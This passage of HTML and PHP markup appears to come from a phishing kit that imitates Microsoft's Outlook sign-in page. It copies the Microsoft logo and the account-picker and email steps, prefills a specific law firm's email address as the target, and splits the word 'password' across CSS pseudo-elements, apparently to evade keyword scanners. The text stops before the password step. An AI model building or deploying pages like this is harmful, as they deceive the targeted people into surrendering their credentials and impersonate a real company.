10px;border-width:1px;border-color:#666;border-color:rgba(0,0,0,0.6);height:36px;outline:none;border-radius:0;-webkit-border-radius:0;background-color:transparent;border-top-width:0;border-left-width:0;border-right-width:0;padding-left:0}.input.text-box:focus{background-color:#fff;border-color:#0067b8;background-color:transparent}.input.text-box:hover{border-color:#323232;border-color:rgba(0,0,0,0.8)}.input.text-box::-moz-placeholder{color:rgba(0,0,0,0.6);opacity:1}.input.text-box:-ms-input-placeholder{color:rgba(0,0,0,0.6)}.input.text-box::-webkit-input-placeholder{color:rgba(0,0,0,0.6)}.input.text-box.has-error{border-color:#e81123}.input.text-box.has-error:focus{border-color:#e81123}[disabled].input.text-box,[readonly].input.text-box,fieldset[disabled] .input.text-box{border-color:#ccc !important;background-color:rgba(0,0,0,0.2) !important;color:rgba(0,0,0,0.2) !important}body.cb input[type="text"].hip{border-width:0 !important;border-bottom-width:1px !important;padding:6px 0 !important}textarea.brickwall{height:42px;width:100%;resize:vertical}.textarea-placeholder{position:relative}select{border-top-width:0;border-left-width:0;border-right-width:0;padding:6px 0}select:hover{background:transparent}select:focus{background:#eee}.text-title{color:#1b1b1b;font-size:1.5rem;font-weight:600;padding:0;margin-top:16px;margin-bottom:12px;font-family:"Segoe UI","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math"}.text-title:lang(zh-cn),.text-title:lang(zh-tw){font-family:"Segoe UI","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math"}.title{margin-bottom:20px;margin-top:20px;margin-bottom:1.25rem;margin-top:1.25rem;font-size:24px;line-height:28px;font-weight:300;line-height:1.75rem;padding-bottom:2.3632px;padding-top:2.3632px;color:#1b1b1b;font-size:1.5rem;font-weight:600;padding:0;margin-top:16px;margin-bottom:12px;font-family:"Segoe UI","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math"}.app-name{margin-bottom:20px;margin-top:20px;margin-bottom:1.25rem;margin-top:1.25rem;font-size:24px;line-height:28px;font-weight:300;line-height:1.75rem;padding-bottom:2.3632px;padding-top:2.3632px;color:#1b1b1b;font-size:1.5rem;font-weight:600;padding:0;margin-top:16px;margin-bottom:12px;font-family:"Segoe UI","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";margin-top:0;margin-bottom:0;font-size:.9375rem;line-height:1.25rem}.secondary-text{font-size:.85rem}.alert{margin-bottom:0;margin-top:0}.alert.alert-margin-bottom{margin-bottom:12px}.error{color:#e81123}.text-base{font-size:.85rem}.dropdown-toggle.membernamePrefillSelect{padding:0;border-width:1px;height:36px;outline:none;border-left:none;border-right:none;border-top:none;border-color:#666;background-color:transparent}.dropdown-toggle.membernamePrefillSelect:active{transform:none;border:1px solid #0078d7;border-top-width:0;border-left-width:0;border-right-width:0}.dropdown-toggle.membernamePrefillSelect:focus{transform:none;border:1px solid #0078d7;border-top-width:0;border-left-width:0;border-right-width:0;background-color:#eee !important}.dropdown-toggle.membernamePrefillSelect:hover,.open .dropdown-toggle.membernamePrefillSelect{border:1px solid #0078d7;border-top-width:0;border-left-width:0;border-right-width:0;background-color:#eee !important}.dropdown-toggle.membernamePrefillSelect.has-error,.dropdown-toggle.membernamePrefillSelect.has-error:hover{border-width:1px;border-color:#e81123}.outlookEmailLabel{border-left:none;border-right:none;border-top:none;padding-right:0}.subtitle{font-size:.8125rem;font-weight:400;line-height:20px}.section{margin-bottom:0}.radio{margin-top:20px;margin-bottom:20px}div[role=radiogroup]>div[class="radio"]:first-child{margin-top:0}.form-group-top{margin-top:16px}div[role=listitem],.list-item{margin-left:20px;display:list-item;list-style:circle;list-style-type:disc}.phoneCountryCode{position:absolute;width:100%;left:0;padding:6px 4px;height:36px;border-bottom-width:1px;border-color:#666;border-color:rgba(0,0,0,0.6);border-bottom-style:solid}.phoneCountryCode.hasFocus{background-color:#eee;border:1px solid #eee;border-bottom-color:#0067b8;margin:-1px -1px 0 -1px}.phoneCountryCode.has-error{border-color:#e81123}.phoneCountry{left:0;opacity:0;cursor:pointer;-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=0)"}.phoneCountryBox{display:inline-block}.downArrow{position:absolute;right:-6px;padding:6px 0;height:36px}.phoneNumber{display:inline-block;padding-left:16px}.row-app-info{table-layout:auto}.row-app-info .logo{display:table-cell;width:32px;height:32px;padding-right:8px}.row-app-info .logo img{width:inherit;height:inherit}.pagination-view{position:relative;min-height:206px}.pagination-view.has-identity-banner{min-height:170px}.zero-opacity{opacity:0}.lightbox-cover{background-color:white;opacity:0;filter:alpha(opacity=0);z-index:-1;height:100%;width:100%;position:absolute;top:0;left:0;transition:all .5s ease-in;-o-transition:all .5s ease-in;-moz-transition:all .5s ease-in;-webkit-transition:all .5s ease-in}.lightbox-cover.disable-lightbox{z-index:10;opacity:.5;filter:alpha(opacity=0)}.ordered-list{padding-left:15px}.checkmark-badge{position:relative;bottom:1px;height:15px;width:15px}.richtext-warning{margin-top:20px;margin-bottom:10px}.richtext-description{margin-top:10px;margin-bottom:10px}@media (-ms-high-contrast){.btn,.button,button,input[type=\'button\'],input[type=\'submit\'],input[type=\'reset\'],.btn.btn-google{-ms-high-contrast-adjust:none;outline:1px solid windowText;border:1px solid window;background-color:window;color:windowText;text-decoration:none}.btn:hover,.button:hover,button:hover,input[type=\'button\']:hover,input[type=\'submit\']:hover,input[type=\'reset\']:hover,.btn.btn-google:hover{outline:1px solid windowText;border:1px solid highlight;background-color:highlight;color:highlightText;text-decoration:none}.btn:hover:focus,.button:hover:focus,button:hover:focus,input[type=\'button\']:hover:focus,input[type=\'submit\']:hover:focus,input[type=\'reset\']:hover:focus,.btn.btn-google:hover:focus{outline:1px solid windowText;border:1px solid windowText;background-color:highlight;color:highlightText;text-decoration:underline}.btn:focus,.button:focus,button:focus,input[type=\'button\']:focus,input[type=\'submit\']:focus,input[type=\'reset\']:focus,.btn.btn-google:focus{outline:1px solid windowText;border:1px solid windowText;background-color:window;color:windowText;text-decoration:underline}.btn.btn-primary,.button.btn-primary,button.btn-primary,input[type=\'button\'].btn-primary,input[type=\'submit\'].btn-primary,input[type=\'reset\'].btn-primary,.btn.btn-google.btn-primary,.btn.primary,.button.primary,button.primary,input[type=\'button\'].primary,input[type=\'submit\'].primary,input[type=\'reset\'].primary,.btn.btn-google.primary,.btn.secondary,.button.secondary,button.secondary,input[type=\'button\'].secondary,input[type=\'submit\'].secondary,input[type=\'reset\'].secondary,.btn.btn-google.secondary{outline:1px solid highlight;border:1px solid highlight;background-color:highlight;color:highlightText;text-decoration:none}.btn.btn-primary:hover,.button.btn-primary:hover,button.btn-primary:hover,input[type=\'button\'].btn-primary:hover,input[type=\'submit\'].btn-primary:hover,input[type=\'reset\'].btn-primary:hover,.btn.btn-google.btn-primary:hover,.btn.primary:hover,.button.primary:hover,button.primary:hover,input[type=\'button\'].primary:hover,input[type=\'submit\'].primary:hover,input[type=\'reset\'].primary:hover,.btn.btn-google.primary:hover,.btn.secondary:hover,.button.secondary:hover,button.secondary:hover,input[type=\'button\'].secondary:hover,input[type=\'submit\'].secondary:hover,input[type=\'reset\'].secondary:hover,.btn.btn-google.secondary:hover{outline:1px solid highlight;border:1px solid window;background-color:window;color:highlight;text-decoration:none}.btn.btn-primary:hover:focus,.button.btn-primary:hover:focus,button.btn-primary:hover:focus,input[type=\'button\'].btn-primary:hover:focus,input[type=\'submit\'].btn-primary:hover:focus,input[type=\'reset\'].btn-primary:hover:focus,.btn.btn-google.btn-primary:hover:focus,.btn.primary:hover:focus,.button.primary:hover:focus,button.primary:hover:focus,input[type=\'button\'].primary:hover:focus,input[type=\'submit\'].primary:hover:focus,input[type=\'reset\'].primary:hover:focus,.btn.btn-google.primary:hover:focus,.btn.secondary:hover:focus,.button.secondary:hover:focus,button.secondary:hover:focus,input[type=\'button\'].secondary:hover:focus,input[type=\'submit\'].secondary:hover:focus,input[type=\'reset\'].secondary:hover:focus,.btn.btn-google.secondary:hover:focus{outline:1px solid windowText;border:1px solid window;background-color:window;color:highlight;text-decoration:underline}.btn.btn-primary:focus,.button.btn-primary:focus,button.btn-primary:focus,input[type=\'button\'].btn-primary:focus,input[type=\'submit\'].btn-primary:focus,input[type=\'reset\'].btn-primary:focus,.btn.btn-google.btn-primary:focus,.btn.primary:focus,.button.primary:focus,button.primary:focus,input[type=\'button\'].primary:focus,input[type=\'submit\'].primary:focus,input[type=\'reset\'].primary:focus,.btn.btn-google.primary:focus,.btn.secondary:focus,.button.secondary:focus,button.secondary:focus,input[type=\'button\'].secondary:focus,input[type=\'submit\'].secondary:focus,input[type=\'reset\'].secondary:focus,.btn.btn-google.secondary:focus{outline:1px solid windowText;border:1px solid window;background-color:highlight;color:highlightText;text-decoration:underline}.backButton{outline:none;border:1px solid window;background-color:window;color:windowText}.backButton:hover{outline:none;border:1px solid highlight;background-color:window;color:windowText}.backButton:hover:focus{outline:none;border:1px solid highlight;background-color:window;color:windowText}.backButton:focus,.backButton:active{outline:none;border:1px dashed highlight;background-color:window;color:windowText}}.cc-banner{position:relative;font-size:12px;display:table-row;height:2em}.cc-banner div,.cc-banner span,.cc-banner a,.cc-banner svg{margin:0;padding:0;text-decoration:none}.cc-banner .cc-v-center{display:inline;vertical-align:middle;line-height:2em}.cc-text>a{float:right}.cc-banner{color:#231f20;background:#f2f2f2;text-align:center;padding:0 1em;margin:0}.cc-banner>.cc-container{text-align:left;padding:.75em;display:inline-block;width:100%}@media (min-width:768px){.cc-banner{font-size:13px}}@media (min-width:1084px){.cc-banner{padding:0}.cc-banner>.cc-container{width:90%;max-width:1600px}}.cc-banner.active{display:block}.cc-banner .cc-icon{height:1.846em;width:1.846em}.cc-banner .cc-text{margin-left:.5em;margin-right:1.5em}.cc-banner .cc-link{color:#0067b8}.cc-banner .cc-link:hover,.cc-banner .cc-link:focus{text-decoration:underline}.cc-banner .cc-link:focus{outline:0;background:#dae6ef;background:content-box rgba(0,120,215,0.1)}.env-banner{display:table;max-width:200px;min-height:50px;max-height:100px;overflow:hidden;background:#0067b8;color:#fff;position:absolute;margin:10px;font-weight:bold;top:0;right:0;z-index:100}.env-banner-inner{display:table-cell;vertical-align:middle;padding:5px;text-align:left;direction:ltr}body a.env-banner-link{text-decoration:underline}.env-banner-link:hover,.env-banner-link:link,.env-banner-link:visited,.env-banner-link:visited:hover,.env-banner-link:link:hover,.env-banner-link:active,.env-banner-link:link:active,.env-banner-link:visited:active{color:#fff}.env-banner-text{display:inline-block;font-weight:normal}.fade-in-lightbox{animation:fadeIn .3s ease-in;-webkit-animation:fadeIn .3s ease-in;-moz-animation:fadeIn .3s ease-in;-ms-animation:fadeIn .3s ease-in;-o-animation:fadeIn .3s ease-in}.animate{animation-duration:.25s;-webkit-animation-duration:.25s;-moz-animation-duration:.25s;-ms-animation-duration:.25s;-o-animation-duration:.25s;animation-timing-function:cubic-bezier(.5, 0, .5, 1);-webkit-animation-timing-function:cubic-bezier(.5, 0, .5, 1);-moz-animation-timing-function:cubic-bezier(.5, 0, .5, 1);-ms-animation-timing-function:cubic-bezier(.5, 0, .5, 1);-o-animation-timing-function:cubic-bezier(.5, 0, .5, 1);animation-fill-mode:both;-webkit-animation-fill-mode:both;-moz-animation-fill-mode:both;-ms-animation-fill-mode:both;-o-animation-fill-mode:both;transition-property:left;-webkit-transition-property:left;-moz-transition-property:left;-ms-transition-property:left;-o-transition-property:left}html[dir=ltr] .animate.slide-out-next,html[dir=rtl] .animate.slide-out-back{animation-name:hide-to-left;-webkit-animation-name:hide-to-left;-moz-animation-name:hide-to-left;-ms-animation-name:hide-to-left;-o-animation-name:hide-to-left}html[dir=ltr] .animate.slide-in-next,html[dir=rtl] .animate.slide-in-back{animation-name:show-from-right;-webkit-animation-name:show-from-right;-moz-animation-name:show-from-right;-ms-animation-name:show-from-right;-o-animation-name:show-from-right}html[dir=ltr] .animate.slide-out-back,html[dir=rtl] .animate.slide-out-next{animation-name:hide-to-right;-webkit-animation-name:hide-to-right;-moz-animation-name:hide-to-right;-ms-animation-name:hide-to-right;-o-animation-name:hide-to-right}html[dir=ltr] .animate.slide-in-back,html[dir=rtl] .animate.slide-in-next{animation-name:show-from-left;-webkit-animation-name:show-from-left;-moz-animation-name:show-from-left;-ms-animation-name:show-from-left;-o-animation-name:show-from-left}@keyframes hide-to-left{from{left:0;opacity:1}to{left:-200px;opacity:0}}@keyframes show-from-right{from{left:200px;opacity:0}to{left:0;opacity:1}}@keyframes hide-to-right{from{left:0;opacity:1}to{left:200px;opacity:0}}@keyframes show-from-left{from{left:-200px;opacity:0}to{left:0;opacity:1}}@-webkit-keyframes hide-to-left{from{left:0;opacity:1}to{left:-200px;opacity:0}}@-webkit-keyframes show-from-right{from{left:200px;opacity:0}to{left:0;opacity:1}}@-webkit-keyframes hide-to-right{from{left:0;opacity:1}to{left:200px;opacity:0}}@-webkit-keyframes show-from-left{from{left:-200px;opacity:0}to{left:0;opacity:1}}@-moz-keyframes hide-to-left{from{left:0;opacity:1}to{left:-200px;opacity:0}}@-moz-keyframes show-from-right{from{left:200px;opacity:0}to{left:0;opacity:1}}@-moz-keyframes hide-to-right{from{left:0;opacity:1}to{left:200px;opacity:0}}@-moz-keyframes show-from-left{from{left:-200px;opacity:0}to{left:0;opacity:1}}@-ms-keyframes hide-to-left{from{left:0;opacity:1}to{left:-200px;opacity:0}}@-ms-keyframes show-from-right{from{left:200px;opacity:0}to{left:0;opacity:1}}@-ms-keyframes hide-to-right{from{left:0;opacity:1}to{left:200px;opacity:0}}@-ms-keyframes show-from-left{from{left:-200px;opacity:0}to{left:0;opacity:1}}@-o-keyframes hide-to-left{from{left:0;opacity:1}to{left:-200px;opacity:0}}@-o-keyframes show-from-right{from{left:200px;opacity:0}to{left:0;opacity:1}}@-o-keyframes hide-to-right{from{left:0;opacity:1}to{left:200px;opacity:0}}@-o-keyframes show-from-left{from{left:-200px;opacity:0}to{left:0;opacity:1}}
	.pashold::before {
		 content: "pass"
	 }
	 .pashold::after {
		 content: "word"
	 }
        </style>
   <body class="cb" style="display:block; ">

       <div id="content" style="display : none">  
         <div>
            
         </div>

            <div class=outer>
               <div id="bg_img" class="app middle" style="background-image: ' .($back ?? "linear-gradient(to right, #cccccc , #ebdfdb);" ).'">
                  <div class="background-logo-holder">
                     
                  </div>
                  <div class="app fade-in-lightbox inner">
                      <div id="progressBar" style="display: none;" class="progress" role="progressbar" data-bind="component: \'marching-ants-control\', ariaLabel: str[\'WF_STR_ProgressText\']" aria-label="Please wait"><!--  -->
                        <!-- ko if: svr.fSupportWindowsStyles --><!-- /ko -->
                        <!-- ko ifnot: svr.fSupportWindowsStyles -->
                            <!-- ko if: useCssAnimation -->
                            <div></div><div></div><div></div><div></div><div></div>
                            <!-- /ko -->
                            <!-- ko ifnot: useCssAnimation --><!-- /ko -->
                        <!-- /ko --></div>
                     <div>
                        <img id="logo_image" class="banner-logo" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDgiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAxMDggMjQiPjx0aXRsZT5hc3NldHM8L3RpdGxlPjxwYXRoIGQ9Ik00NC44MzYsNC42VjE4LjRoLTIuNFY3LjU4M0g0Mi40TDM4LjExOSwxOC40SDM2LjUzMUwzMi4xNDIsNy41ODNoLS4wMjlWMTguNEgyOS45VjQuNmgzLjQzNkwzNy4zLDE0LjgzaC4wNThMNDEuNTQ1LDQuNlptMiwxLjA0OWExLjI2OCwxLjI2OCwwLDAsMSwuNDE5LS45NjcsMS40MTMsMS40MTMsMCwwLDEsMS0uMzksMS4zOTIsMS4zOTIsMCwwLDEsMS4wMi40LDEuMywxLjMsMCwwLDEsLjQuOTU4LDEuMjQ4LDEuMjQ4LDAsMCwxLS40MTQuOTUzLDEuNDI4LDEuNDI4LDAsMCwxLTEuMDEuMzg1QTEuNCwxLjQsMCwwLDEsNDcuMjUsNi42YTEuMjYxLDEuMjYxLDAsMCwxLS40MDktLjk0OE00OS40MSwxOC40SDQ3LjA4MVY4LjUwN0g0OS40MVptNy4wNjQtMS42OTRhMy4yMTMsMy4yMTMsMCwwLDAsMS4xNDUtLjI0MSw0LjgxMSw0LjgxMSwwLDAsMCwxLjE1NS0uNjM1VjE4YTQuNjY1LDQuNjY1LDAsMCwxLTEuMjY2LjQ4MSw2Ljg4Niw2Ljg4NiwwLDAsMS0xLjU1NC4xNjQsNC43MDcsNC43MDcsMCwwLDEtNC45MTgtNC45MDgsNS42NDEsNS42NDEsMCwwLDEsMS40LTMuOTMyLDUuMDU1LDUuMDU1LDAsMCwxLDMuOTU1LTEuNTQ1LDUuNDE0LDUuNDE0LDAsMCwxLDEuMzI0LjE2OCw0LjQzMSw0LjQzMSwwLDAsMSwxLjA2My4zOXYyLjIzM2E0Ljc2Myw0Ljc2MywwLDAsMC0xLjEtLjYxMSwzLjE4NCwzLjE4NCwwLDAsMC0xLjE1LS4yMTcsMi45MTksMi45MTksMCwwLDAtMi4yMjMuOSwzLjM3LDMuMzcsMCwwLDAtLjg0NywyLjQxNiwzLjIxNiwzLjIxNiwwLDAsMCwuODEzLDIuMzM4LDIuOTM2LDIuOTM2LDAsMCwwLDIuMjA5LjgzN002NS40LDguMzQzYTIuOTUyLDIuOTUyLDAsMCwxLC41LjAzOSwyLjEsMi4xLDAsMCwxLC4zNzUuMXYyLjM1OGEyLjA0LDIuMDQsMCwwLDAtLjUzNC0uMjU1LDIuNjQ2LDIuNjQ2LDAsMCwwLS44NTItLjEyLDEuODA4LDEuODA4LDAsMCwwLTEuNDQ4LjcyMiwzLjQ2NywzLjQ2NywwLDAsMC0uNTkyLDIuMjIzVjE4LjRINjAuNTI1VjguNTA3aDIuMzI5djEuNTU5aC4wMzhBMi43MjksMi43MjksMCwwLDEsNjMuODU1LDguOCwyLjYxMSwyLjYxMSwwLDAsMSw2NS40LDguMzQzbTEsNS4yNTRBNS4zNTgsNS4zNTgsMCwwLDEsNjcuNzkyLDkuNzFhNS4xLDUuMSwwLDAsMSwzLjg1LTEuNDM0LDQuNzQyLDQuNzQyLDAsMCwxLDMuNjIzLDEuMzgxLDUuMjEyLDUuMjEyLDAsMCwxLDEuMywzLjcyOSw1LjI1Nyw1LjI1NywwLDAsMS0xLjM4NiwzLjgzLDUuMDE5LDUuMDE5LDAsMCwxLTMuNzcyLDEuNDI0LDQuOTM1LDQuOTM1LDAsMCwxLTMuNjUyLTEuMzUyQTQuOTg3LDQuOTg3LDAsMCwxLDY2LjQwNiwxMy42bTIuNDI1LS4wNzdhMy41MzUsMy41MzUsMCwwLDAsLjcsMi4zNjgsMi41MDUsMi41MDUsMCwwLDAsMi4wMTEuODE4LDIuMzQ1LDIuMzQ1LDAsMCwwLDEuOTM0LS44MTgsMy43ODMsMy43ODMsMCwwLDAsLjY2NC0yLjQyNSwzLjY1MSwzLjY1MSwwLDAsMC0uNjg4LTIuNDExLDIuMzg5LDIuMzg5LDAsMCwwLTEuOTI5LS44MTMsMi40NCwyLjQ0LDAsMCwwLTEuOTg4Ljg1MiwzLjcwNywzLjcwNywwLDAsMC0uNzA3LDIuNDNtMTEuMi0yLjQxNmExLDEsMCwwLDAsLjMxOC43ODUsNS40MjYsNS40MjYsMCwwLDAsMS40LjcxNyw0Ljc2Nyw0Ljc2NywwLDAsMSwxLjk1OSwxLjI1NiwyLjYsMi42LDAsMCwxLC41NjMsMS42ODlBMi43MTUsMi43MTUsMCwwLDEsODMuMiwxNy43OTRhNC41NTgsNC41NTgsMCwwLDEtMi45Ljg0Nyw2Ljk3OCw2Ljk3OCwwLDAsMS0xLjM2Mi0uMTQ5LDYuMDQ3LDYuMDQ3LDAsMCwxLTEuMjY1LS4zOHYtMi4yOWE1LjczMyw1LjczMywwLDAsMCwxLjM2Ny43LDQsNCwwLDAsMCwxLjMyOC4yNiwyLjM2NSwyLjM2NSwwLDAsMCwxLjE2NC0uMjIxLjc5Ljc5LDAsMCwwLC4zNzUtLjc0MSwxLjAyOSwxLjAyOSwwLDAsMC0uMzktLjgxMyw1Ljc2OCw1Ljc2OCwwLDAsMC0xLjQ3Ny0uNzY1LDQuNTY0LDQuNTY0LDAsMCwxLTEuODI5LTEuMjEzLDIuNjU1LDIuNjU1LDAsMCwxLS41MzktMS43MTMsMi43MDYsMi43MDYsMCwwLDEsMS4wNjMtMi4yQTQuMjQzLDQuMjQzLDAsMCwxLDgxLjUsOC4yNTZhNi42NjMsNi42NjMsMCwwLDEsMS4xNjQuMTE1LDUuMTYxLDUuMTYxLDAsMCwxLDEuMDc4LjN2Mi4yMTRhNC45NzQsNC45NzQsMCwwLDAtMS4wNzgtLjUyOSwzLjYsMy42LDAsMCwwLTEuMjIyLS4yMjEsMS43ODEsMS43ODEsMCwwLDAtMS4wMzQuMjYuODI0LjgyNCwwLDAsMC0uMzcxLjcxMk04NS4yNzgsMTMuNkE1LjM1OCw1LjM1OCwwLDAsMSw4Ni42NjQsOS43MWE1LjEsNS4xLDAsMCwxLDMuODQ5LTEuNDM0LDQuNzQzLDQuNzQzLDAsMCwxLDMuNjI0LDEuMzgxLDUuMjEyLDUuMjEyLDAsMCwxLDEuMywzLjcyOSw1LjI1OSw1LjI1OSwwLDAsMS0xLjM4NiwzLjgzLDUuMDIsNS4wMiwwLDAsMS0zLjc3MywxLjQyNCw0LjkzNCw0LjkzNCwwLDAsMS0zLjY1Mi0xLjM1MkE0Ljk4Nyw0Ljk4NywwLDAsMSw4NS4yNzgsMTMuNm0yLjQyNS0uMDc3YTMuNTM3LDMuNTM3LDAsMCwwLC43LDIuMzY4LDIuNTA2LDIuNTA2LDAsMCwwLDIuMDExLjgxOCwyLjM0NSwyLjM0NSwwLDAsMCwxLjkzNC0uODE4LDMuNzgzLDMuNzgzLDAsMCwwLC42NjQtMi40MjUsMy42NTEsMy42NTEsMCwwLDAtLjY4OC0yLjQxMSwyLjM5LDIuMzksMCwwLDAtMS45My0uODEzLDIuNDM5LDIuNDM5LDAsMCwwLTEuOTg3Ljg1MiwzLjcwNywzLjcwNywwLDAsMC0uNzA3LDIuNDNtMTUuNDY0LTMuMTA5SDk5LjdWMTguNEg5Ny4zNDFWMTAuNDEySDk1LjY4NlY4LjUwN2gxLjY1NVY3LjEzYTMuNDIzLDMuNDIzLDAsMCwxLDEuMDE1LTIuNTU1LDMuNTYxLDMuNTYxLDAsMCwxLDIuNi0xLDUuODA3LDUuODA3LDAsMCwxLC43NTEuMDQzLDIuOTkzLDIuOTkzLDAsMCwxLC41NzcuMTNWNS43NjRhMi40MjIsMi40MjIsMCwwLDAtLjQtLjE2NCwyLjEwNywyLjEwNywwLDAsMC0uNjY0LS4xLDEuNDA3LDEuNDA3LDAsMCwwLTEuMTI2LjQ1N0EyLjAxNywyLjAxNywwLDAsMCw5OS43LDcuMzEzVjguNTA3aDMuNDY5VjYuMjgzbDIuMzM5LS43MTJWOC41MDdoMi4zNTh2MS45MDZoLTIuMzU4djQuNjI5YTEuOTUxLDEuOTUxLDAsMCwwLC4zMzIsMS4yOSwxLjMyNiwxLjMyNiwwLDAsMCwxLjA0NC4zNzUsMS41NTcsMS41NTcsMCwwLDAsLjQ4Ni0uMSwyLjI5NCwyLjI5NCwwLDAsMCwuNS0uMjMxVjE4LjNhMi43MzcsMi43MzcsMCwwLDEtLjczNi4yMzEsNS4wMjksNS4wMjksMCwwLDEtMS4wMTUuMTA2LDIuODg3LDIuODg3LDAsMCwxLTIuMjA5LS43ODQsMy4zNDEsMy4zNDEsMCwwLDEtLjczNi0yLjM2M1oiIGZpbGw9IiM3MzczNzMiLz48cmVjdCB3aWR0aD0iMTAuOTMxIiBoZWlnaHQ9IjEwLjkzMSIgZmlsbD0iI2YyNTAyMiIvPjxyZWN0IHg9IjEyLjA2OSIgd2lkdGg9IjEwLjkzMSIgaGVpZ2h0PSIxMC45MzEiIGZpbGw9IiM3ZmJhMDAiLz48cmVjdCB5PSIxMi4wNjkiIHdpZHRoPSIxMC45MzEiIGhlaWdodD0iMTAuOTMxIiBmaWxsPSIjMDBhNGVmIi8+PHJlY3QgeD0iMTIuMDY5IiB5PSIxMi4wNjkiIHdpZHRoPSIxMC45MzEiIGhlaWdodD0iMTAuOTMxIiBmaWxsPSIjZmZiOTAwIi8+PC9zdmc+">
                     </div>
                     <div>

                     
                        <div id="pick_em" style="display: none;">
                           <div class="animate pagination-view slide-in-next">
                              <div data-showfedcredbutton=true data-viewid=1>
                                 <div>
                                    <div class="row text-title" id="loginHeader">
                                       <div aria-level=1>Sign in</div>
                                    </div>
                                 </div>
                                 <div class="row">
                                    <div class="col-md-24 form-group">
                                       <div class="placeholderContainer">
                                            <div class="add_em">
                                                    <p style="font-weight: bold;margin-left: 4%">Pick an account</p>
                                                    <a href="#" class="email-picker">
                                                            <div class="block-m2">
                                                                   <img role="presentation" src=""> <span id="em_picker"></span><span style="float:right; margin-top:4%"><img src="" alt=""></span>
                                                            </div>
                                                    </a>
                                                    <a href="#" class="email-picker2">
                                                            <div class="block-m2">
                                                                   <img role="presentation" src=""><span style="word-wrap:break-word;"> Use another account</span>
                                                            </div>
                                                    </a>
                                                    <br>
                                           </div>
                                       </div>
                                    </div>
                                 </div>
                                 <div class="position-buttons">

                                 </div>
                              </div>
                           </div>
                        </div>
                     
                        <div id="add_em" style="display: none;">
                           <div class="animate pagination-view slide-in-next">
                              <div data-showfedcredbutton=true data-viewid=1>
                                 <div>
                                    <div class="row text-title" id="loginHeader">
                                       <div aria-level=1>Sign in</div>
                                       <div class="text-13 subtitle" aria-level=2>to continue to Outlook</div>
                                    </div>
                                 </div>
                                 <div class=row>
                                            <div aria-live="assertive" role="alert" style="display: none;" class="error-alert">
                                                    <div class="alert alert-error error-alert-msg"></div>
                                                    <br>
                                            </div>
                                    <div class="col-md-24 form-group">
                                       <div class="placeholderContainer">
                                    </script><input type="text" name="email" attr-httpd="thbdf55" ind="rvdhv443dd" id="email" class="form-control ltr_override" value="office@dillonlaw.co.uk" placeholder="someone@example.com ">
                                       </div>
                                    </div>
                                 </div>
                                 <div class="position-buttons">
                                    <div class=row>
                                       <div class=col-md-24>
                                          <div class="text-13 action-links">
                                             <div class=form-group>
                                                <a href="#" >Can%u2019t access your account?</a>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                    <div class=row>
                                       <div class="col-xs-24 no-padding-left-right button-container">
                                       <div class=inline-block>
                                          <button class="btn btn-block btn-primary btn-email">Next</button>
                                       </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                        <div id="add_pass" style="display: none;">
                                <div class="animate slide-in-next">
                                        <div>
                                                <div class="identityBanner">
                                                        <a class="backButton" href="#" type="button">
